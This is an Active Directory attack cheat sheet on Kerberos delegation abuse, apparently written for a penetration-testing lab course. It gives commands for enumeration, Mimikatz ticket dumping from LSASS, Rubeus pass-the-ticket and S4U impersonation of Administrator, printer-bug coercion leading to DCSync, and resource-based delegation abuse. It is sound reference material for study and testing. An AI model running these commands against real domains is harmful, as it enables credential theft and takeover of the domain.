# Delegations

Kerberos delegation allows services to impersonate the user in order to communicate with another service and perform actions on behalf the user.

## Unconstrained Delegation

Unconstrained Delegation allowing any service to use a user TGT in order to communicate with the **any** other service.

The TGT will be stored in the LSASS process.

### Enumerate

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-DomainComputer -UnConstrained
```
{% endtab %}

{% tab title="AD Module" %}
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```
{% endtab %}
{% endtabs %}

### Exploitation

It is possible to extract the TGTs from the service's LSASS process using `Mimikatz` and perform pass the ticket.

```powershell
# Extract the TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Pass the ticket
Invoke-Mimikatz -Command '"kerberos::ptt TGT.kirbi"' 
Rubeus.exe ptt /ticket:"base64 | file.kirbi" # Rubues allows base64 format as alternative
```

### Printer bug

The printer bug uses an RPC call of MS-RPRN which allows any domain user can force any machine that running the Spooler service to connect to second a machine of the domain user's choice.

1. Run on compromised Server Rubeus monitor

```powershell
Rubeus.exe monitor /interval:5 /nowrap
```

2. Run on compromised Domain User the RPC Call using [SpoolSample](https://github.com/leechristensen/SpoolSample) \ [Coercer](https://github.com/p0dalirius/Coercer)

```powershell
MS-RPRN.exe \\dc.machine.local \\compromised.machine.local
```

3. Pass The Ticket
4. DC Sync

## Constrained Delegation

Constrained Delegation allowing **specified** services on **specified** computers to use a user TGT in order to communicate with the **any** other service.

in order to create a more restrictive delegation mechanism, Microsoft develop two Kerberos extensions known as  Service for user (S4U):

* Service for User to Self  (S4U2self) - allows a service to obtain forwardable TGS to itself on behalf of user.
* Service for User to Proxy (S4U2proxy) - allows a service to obtain a TGS to another service on behalf of user.\
  Note that the other services are from white list controlled by `msDS-AllowedToDelegateTo` attribute.

### Enumerate

{% tabs %}
{% tab title="PowerView" %}
<pre class="language-powershell"><code class="lang-powershell"><strong>Get-DomainUser -TrustedToAuth
</strong>Get-DomainComputer -TrustedToAuth
</code></pre>
{% endtab %}

{% tab title="AD Module" %}
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```
{% endtab %}
{% endtabs %}

### Exploitation

{% code overflow="wrap" %}
```powershell
Rubeus.exe s4u /user:websvc /aes256:<aes256_key> /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.local /ptt

# You can change the target service in the ticket
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<aes256_key> /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```
{% endcode %}

Check if worked

```powershell
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$ 
```

### Resource based

Instead of the white list of SPNs controlled by `msDS-AllowedToDelegateTo` attribute, resource based controoled by the `msDS-AllowedToActOnBehalfOfOtherIdentity`

To abuse RBCD we need:

1. Write permissions over the target service `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
2. AD Object which has SPN configured&#x20;

Abuse example:

```
# Create Computers - AD Object which has SPN configured 
$comps = 'dcorp-student1$','dcorp-student2$'
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```

